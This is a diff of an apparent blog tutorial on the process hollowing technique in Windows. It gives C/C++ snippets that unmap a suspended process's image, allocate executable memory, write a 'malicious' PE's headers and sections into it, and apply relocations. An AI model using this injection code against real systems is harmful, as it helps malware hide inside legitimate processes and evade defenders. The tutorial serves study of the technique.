@@ -124,6 +124,7 @@ Now The handle to this file is stored in ```HEvilFile```and we can grap The size
 So after reading the file, 
 
 ### Getting the Current Context
+
 Of course you are wondering what is this Context or Thread Context, lets take an overview on it. A thread context is a structure that contains the register values and other state information of a thread. It is crucial for operations such as debugging, thread manipulation, and our today's technique ```process hollowing```. The context includes the ```instruction pointer```, ```stack pointer```, and other registers that define the current state of the CPU as it executes the thread. So by manipulating the context, a program can control the execution flow of a thread, which is essential for techniques like process hollowing, where the goal is to replace the code of a legitimate process with malicious code while maintaining the execution context.
 
 So lets see it on the code.
@@ -135,10 +136,13 @@ So lets see it on the code.
         return 0;
     }
 ```
-Here, a new CONTEXT structure is allocated on the heap. LPCONTEXT is a pointer to a CONTEXT structure which we'll use this to hold the register values and other state information of the thread.
-The ContextFlags member of the CONTEXT structure is set to CONTEXT_FULL. This indicates that all parts of the thread's context should be retrieved, including the control registers, integer registers, and floating-point registers.
+Here, a new CONTEXT structure is allocated on the heap. LPCONTEXT is a pointer to a CONTEXT structure which we'll use this to hold the register values and other state information of the thread. The ContextFlags member of the CONTEXT structure is set to CONTEXT_FULL. This indicates that all parts of the thread's context should be retrieved, including the control registers, integer registers, and floating-point registers.
+Finally the GetThreadContext function is called to retrieve the context of the thread identified by proc_info.hThread.
 
 ### Getting the Base Address of the Suspended Process
+
+In process hollowing, obtaining the base address is crucial for locating the Entry Point, it helps in finding the entry point of the process's code, which can be replaced with malicious code.
+
 
 ```
     PVOID BaseAddress;
@@ -151,20 +155,18 @@ The ContextFlags member of the CONTEXT structure is set to CONTEXT_FULL. This in
         ReadProcessMemory(proc_info.hProcess, (PVOID)(pContext->Rdx + (sizeof(SIZE_T) * 2)), &BaseAddress, sizeof(PVOID), NULL);
     #endif
 ```
-### Unmapping Sections
-```
-    printf("Unmapping Section.\n");
-    HMODULE hNTDLL = GetModuleHandleA("ntdll");
-    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
-    _NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
-    if (NtUnmapViewOfSection(proc_info.hProcess, BaseAddress)) {
-        printf("Error Unmapping Section\n");
-        return 0;
-    }
-```
-### Allocate and write malicious code
+So the way to get the base adress of the program or the target code depends on the machine architecture, in the code we defined a use case for X86 and WIN64, to retreive the base adress from the context registers ( Ebx or Rdx ).
 
-As usual, to allocate memory in the target process we use VirtualAllocEx(), so to understand the Writing of the code in the allocated memory, you should know about the structure of a PE file ( Portable Executable ). A Portable Executable (PE) file is a file format used in Windows operating systems for executables, object code, and DLLs (Dynamic Link Libraries). The format is designed so that the operating system can load and manage these files efficiently. 
+There is other ways to retreive the base adress like retreive it from the PEB structure, The PEB ( Process Environment Block ) is a structure in the Windows operating system that contains information about a process, including the base address of the loaded modules. 
+
+We will cover this in coming blogs.
+
+### Unmapping Sections
+After we loaded our malicious file image in memory, lets unmap the target process.
+The way to do that is by using the NtUnmapViewOfSection from the ntdll.dll library, to import it from this library we use  GetModuleHandleA() to get a handle for the ntdll.dll and GetProcAddress() to retrive the NtUnmapViewOfSection API from it.
+So lets unmap the PE sections of the target process. If you dont know what i mean by Sections, lets cover the PE file architecture.
+
+A Portable Executable (PE) file is a file format used in Windows operating systems for executables, object code, and DLLs (Dynamic Link Libraries). The format is designed so that the operating system can load and manage these files efficiently. 
 
 This is easy right ?
 
@@ -191,7 +193,25 @@ Here are some common Sections in PE Files.
 | `.tls`   | Contains data for thread-local storage.                                                 | Read-write          |
 | `.debug` | Contains debugging information.  
 
-So i encourage you to do your homeworks about these stuffs, now let's break down the code.
+So i encourage you to do your homeworks about these stuffs.
+
+```
+    printf("Unmapping Section.\n");
+    HMODULE hNTDLL = GetModuleHandleA("ntdll");
+    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
+    _NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
+    if (NtUnmapViewOfSection(proc_info.hProcess, BaseAddress)) {
+        printf("Error Unmapping Section\n");
+        return 0;
+    }
+```
+Note that the ```NtUnmapViewOfSection(proc_info.hProcess, BaseAddress)``` takes a handle to the process and the base adress of it, from where it should unmap the sections. 
+
+Now our target process is clear of sections, what we need know os to allocate space on it's memory to write our malicious code sections.
+
+### Allocate and write malicious code
+
+As usual, to allocate memory in the target process we use VirtualAllocEx(), so to understand the Writing of the code in the allocated memory.
 
 ```cpp
     PIMAGE_DOS_HEADER dos_head = (PIMAGE_DOS_HEADER)EvilImage;
@@ -199,27 +219,8 @@ So i encourage you to do your homeworks about these stuffs, now let's break down
 
     PVOID mem = VirtualAllocEx(proc_info.hProcess, BaseAddress, nt_head->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
 ```
-First, as we said before, we allocate space to contain our malicious code in the unmapped memory. we grap the size of the code to allocate from the code PE header using ``` pSourceHeaders->OptionalHeader.SizeOfImage ```.
+First thing, we retrieve the DOS and NT headers from the mapped malicious file., as we said before, we allocate space to contain our malicious code in the unmapped memory. we grap the size of the code to allocate from our malicious code PE header using ``` nt_head->OptionalHeader.SizeOfImage ```.
 
-After that, we start to write our code PE headers and sections on the allocated memory using WriteProcessMemory(), taking as parameters the pbuffer ( holds our code ) and the base adress to where it should start writing.
-
-Starting by writing the PE headers, this part in the code explains itself by taking just the size of headers from the buffer and starting to write these headers from the adress which is the image base adress taken from the PEB  ```pPEB->ImageBaseAddress```.
-
-```cpp
-if (!WriteProcessMemory(
-        pProcessInfo->hProcess,                 
-        pPEB->ImageBaseAddress, 
-        pBuffer, 
-        pSourceHeaders->OptionalHeader.SizeOfHeaders, 
-        0
-    ))
-    {
-        printf("Error writing process memory\r\n");
-        return;
-    }
-```
-Retrieves the DOS and NT headers from the mapped malicious file.
-Allocates memory in the suspended process for the malicious image
 ```
     if (!WriteProcessMemory(proc_info.hProcess, BaseAddress, EvilImage, nt_head->OptionalHeader.SizeOfHeaders, 0)) {
         printf("Failed to write Headers\n");
@@ -236,6 +237,10 @@ Allocates memory in the suspended process for the malicious image
         }
     }
 ```
+
+So we start by writing the PE optional headers that contains informations like the base adress, number of sections ... , then we iterate over the sections, for each one we got the start adress of the section and write it in the allocated memory. 
+Super easy.
+
 ### Adjust Base Adresses ( relocating : The hard part for me )
 
 It seems like we are done !!! but no, we should adjust the base addresses of the code and data if the executable is not loaded at its preferred base address. 
@@ -303,6 +308,21 @@ For more understanding on why we need this relocation, When an executable is com
     }
 
 ```
+So we start by checking if BaseOffset is non-zero. BaseOffset represents the difference between the original base address and the new base address of the process image. If BaseOffset is zero, there's no need for relocation, so the code skips this section. but this is rarely happen.
+
+So lets break the code to steps,
+- **Looking for .reloc section** 
+We need to grap the .reloc section to adjust adresses, so looping on the sections find the .reloc.
+Also we calculate the address of each section header using the base address of the image and the size of the headers.
+```
+for (int i = 0; i < nt_head->FileHeader.NumberOfSections; i++) {
+    sec_head = (PIMAGE_SECTION_HEADER)((LPBYTE)EvilImage + dos_head->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
+    char pSectionName[] = ".reloc";
+    if (memcmp(sec_head->Name, pSectionName, strlen(pSectionName))) {
+        continue;
+    }
+```
+- *
 ### Updating Context and Resuming the Process
 
 ```
